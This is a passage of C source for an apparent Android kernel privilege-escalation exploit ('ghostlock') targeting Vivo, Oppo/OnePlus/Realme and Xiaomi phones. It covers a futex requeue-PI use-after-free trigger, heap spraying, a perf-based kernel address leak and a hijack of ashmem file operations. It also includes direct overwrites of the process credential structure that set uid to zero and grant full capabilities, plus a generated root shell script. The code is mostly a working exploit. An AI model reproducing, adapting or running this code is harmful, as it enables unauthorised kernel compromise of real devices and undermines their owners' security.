...
int is_vivo(void) {
  char buf[256];
  if (__system_property_get("ro.product.manufacturer", buf) > 0) {
    return strncasecmp(buf, "vivo", 4) == 0;
  }
  return 0;
}

static int is_oplus(void) {
  char buf[256];
  if (__system_property_get("ro.product.manufacturer", buf) > 0) {
    if (strncasecmp(buf, "oppo", 4) == 0 || strncasecmp(buf, "oneplus", 7) == 0 || strncasecmp(buf, "realme", 6) == 0)
      return 1;
  }
  return 0;
}

static int kernel_version_6_12(void) {
  struct utsname uts;
  if (uname(&uts) < 0) return 0;
  return strncmp(uts.release, "6.12", 4) == 0;
}

static int use_edeadlk_retry(void) {
  /* Vivo always uses retry. Oplus family (including X9u) uses the same stable single-shot scheme as OnePlus 13. */
  if (is_vivo()) return 1;
  return 0;
}
...
static void fr_log(const char *msg) {
  if (!use_edeadlk_retry()) return;
  int fd = open("/data/local/tmp/fr_probe.txt", O_WRONLY | O_CREAT | O_APPEND, 0644);
  if (fd >= 0) {
...
#endif
  const char *build_id = getenv("GHOSTLOCK_BUILD_ID");
  if (build_id && *build_id) {
    pr_info("device build id: %s\n", build_id);
  }
  for (int i = 0; known_offsets[i].uname_r || known_offsets[i].build_id; i++) {
    int release_matches = known_offsets[i].uname_r &&
...
int run_main_route_threads(void) {
  ...
  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
    usleep(1000);
  pr_info("  PI route: threads ready, requeuing...\n");

  if (use_edeadlk_retry()) {
    /* Vivo & Android 16 Oplus specific: EDEADLK retry loop to arm UAF reliably.
     * Reference: xiaohj233/ghostlock-x200-root */
    usleep(100000);
    long rq = -1;
    int rq_errno = 0;
    for (int rq_try = 0; rq_try < 200; rq_try++) {
      errno = 0;
      rq = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
      rq_errno = errno;
      if (rq >= 0) break;
      if (rq_errno == EDEADLK) {
        pr_info("  PI route [Retry]: requeue EDEADLK (UAF armed), continuing\n");
        break;
      }
      if (rq_errno != EAGAIN) {
        pr_warning("  PI route [Retry]: requeue unexpected ret=%ld errno=%d\n", rq, rq_errno);
        break;
      }
      usleep(500);
    }
    if (rq >= 0 || rq_errno == EDEADLK) {
        /* Continue waiting for route_done */
    } else {
        pr_error("  PI route [Retry]: requeue failed fatally\n");
    }
  } else {
    /* Oplus 6.6 (OnePlus 13)/Generic: Single shot requeue (Stable 710f36b logic). */
    usleep(50000);
    errno = 0;
    futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
    pr_info("  PI route [Oplus/Generic]: requeue returned (errno=%d)\n", errno);
  }
...
static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) {
  ...
  page_base = prepare_good_kernel_page(1);
  if (!page_base) { pr_warning("  heap spray failed\n"); clear_pselect_write(); return 0; }
  TIMER("  heap spray done");
  pr_info("  PI route start...\n");
  int routed = run_main_route_threads();
  TIMER("  PI route done");
  clear_pselect_write();
  if (!routed) {
    pr_warning("  PI route did not produce a verified write (last_step=%d errno=%d)\n", route_last_step, route_last_errno);
  } else {
    pr_success("  PI route verified write ok\n");
  }
  return routed;
}
...
static void write_root_script(void) {
  ...
  int n = snprintf(
      ...
      "mkdir -p /sdcard/Download/K 2>/dev/null\n"
      "cp \"$LOG\" /sdcard/Download/K/ghostlock_ksu_$(date +%%Y%%m%%d_%%H%%M%%S).log 2>/dev/null\n"
      ...
      "  # Network recovery for Android 15 / ColorOS 15\n"
      "  for svc in netd dnsresolver mdnsd fwmarkd; do\n"
      ...
      "  done\n"
      "  sleep 1\n"
      "  echo \"[*] network services restarted\" >>\"$LOG\"\n"
      "else\n"
...
int run_exploit(int argc, char **argv) {
  ...
  fr_log("stage: offsets selected");

  log_startup_context();
  init_p0_profile();
  fr_log("stage: exploit start");
  pin_to_core(CORE);
  ...
  if (is_vivo()) {
    ...
    if (g_hijack_fd >= 0) {
      g_hijack_file_addr = perf_leak_candidate(g_hijack_fd, 600000);
      if (g_hijack_file_addr) {
        pr_success("Vivo Single-FD leak: 0x%016llx\n", (unsigned long long)g_hijack_file_addr);
      } else {
        pr_warning("Vivo Single-FD leak failed, falling back to global hijack\n");
      }
    }
  }
  ...
  if (!selinux_ok) {
    ...
    if (!selinux_ok) {
      fr_log("stage: W1 failed");
      pr_warning("Write 1 failed\n");
      return 1;
    }
    fr_log("stage: W1 success");
  ...
  for (int round = 1; round <= 3; round++) {
    ...
    int got_root = 0;
    if (is_vivo() && g_hijack_file_addr && ASHMEM_FOPS) {
      /* Vivo Single-FD Hijack Flow (xiaohj233 style) */
      pr_info("Vivo: starting Single-FD hijack flow...\n");
      uintptr_t target = g_hijack_file_addr + FOPS_PTR_OFF;
      if (do_one_write(target, "Vivo: Single-FD Hijack", 1, 1)) {
        int cfd = open_ashmem_device();
        if (cfd >= 0) {
          pr_success("Vivo: Single-FD Hijack success, patching cred directly...\n");
          uintptr_t cred = 0;
          if (configfs_read_once(cfd, child_task + TASK_CRED_OFF, &cred, 8) == 8 && is_direct_ptr(cred)) {
            uint64_t zero = 0;
            uint64_t full = ~0ULL;
            configfs_write_once(cfd, cred + 0x08, &zero, 8);   /* uid/gid */
            configfs_write_once(cfd, cred + 0x18, &zero, 8);   /* euid/egid */
            configfs_write_once(cfd, cred + 0x38, &full, 8);   /* cap_permitted */
            configfs_write_once(cfd, cred + 0x40, &full, 8);   /* cap_effective */
            pr_success("Vivo: Direct cred patch success!\n");
            
            /* Restore fops to avoid instability */
            uintptr_t orig_fops = text_addr(ASHMEM_FOPS);
            configfs_write_once(cfd, target, &orig_fops, 8);
            pr_info("Vivo: fops restored.\n");
            
            close(cfd);
            got_root = 1;
          } else {
            pr_warning("Vivo: Failed to read child cred via hijacked FD\n");
            close(cfd);
          }
        }
      }
    } else {
      /* Standard flow for Oplus/Xiaomi/Generic */
      if (is_vivo()) {
        pr_info("Vivo device detected; neutralizing vr.ko tags (pre-W2)...\n");
        do_one_write(child_task + TASK_VR_TAG_A_OFF, "Vivo: tag_a", 1, 1);
        do_one_write(child_task + TASK_VR_TAG_B_OFF, "Vivo: tag_b", 1, 1);
        do_one_write(child_task + TASK_FLAGS_OFF, "Vivo: flags", 1, 1);
      }
    ...
    if (got_root) fr_log("stage: W2 success");

    if (got_root && is_vivo()) {
      pr_info("Vivo root confirmed; re-clearing tags (post-W2)...\n");
      do_one_write(child_task + TASK_VR_TAG_A_OFF, "Vivo: tag_a_post", 1, 1);
      do_one_write(child_task + TASK_VR_TAG_B_OFF, "Vivo: tag_b_post", 1, 1);
    }
    if (!got_root) {
